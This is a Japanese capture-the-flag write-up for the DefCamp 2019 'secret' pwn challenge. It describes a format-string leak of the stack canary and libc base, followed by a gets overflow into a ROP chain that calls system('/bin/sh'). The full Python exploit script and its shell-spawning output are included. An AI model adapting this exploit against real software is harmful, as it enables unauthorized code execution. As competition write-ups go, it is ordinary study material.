# [pwn 162pts] secret - DefCamp CTF Qualification 2019
64ビットバイナリで、RELRO以外有効です。
```
$ checksec -f pwn_secret
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   82 Symbols     Yes      0               8       pwn_secret
```
IDAで解析すると、printfによるFormat String Exploitが可能なことと、getsによるStack Overflowが可能なことが分かります。
libcが配られていませんが、これはlibcdbで分かった前提で解いていいのかな？

```python
from ptrlib import *

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
sock = Process("./pwn_secret")
rop_pop_rdi = 0x0002155f
rop_ret = 0x000008aa

# libc leak
sock.sendlineafter("Name: ", "%15$p.%17$p")
sock.recvuntil("Hillo ")
l = sock.recvline().split(b".")
canary = int(l[0], 16)
libc_base = int(l[1], 16) - libc.symbol("__libc_start_main") - 0xe7
logger.info("canary = " + hex(canary))
logger.info("libc base = " + hex(libc_base))

# get the shell!
payload = b'A' * 0x88
payload += p64(canary)
payload += p64(0xdeadbeef)
payload += p64(libc_base + rop_ret)
payload += p64(libc_base + rop_pop_rdi)
payload += p64(libc_base + next(libc.search("/bin/sh")))
payload += p64(libc_base + libc.symbol("system"))
sock.sendlineafter("Phrase: ", payload)

sock.interactive()
```

ほい。
```
$ python solve.py 
[+] __init__: Successfully created new process (PID=21942)
[+] <module>: canary = 0x509b1bb479159d00
[+] <module>: libc base = 0x7fe17fbfc000
[ptrlib]$ Entered secret > AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA .

Entered strings are not same!
id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
[ptrlib]$
```

# 感想
久しぶりに簡単なの来て爽やか。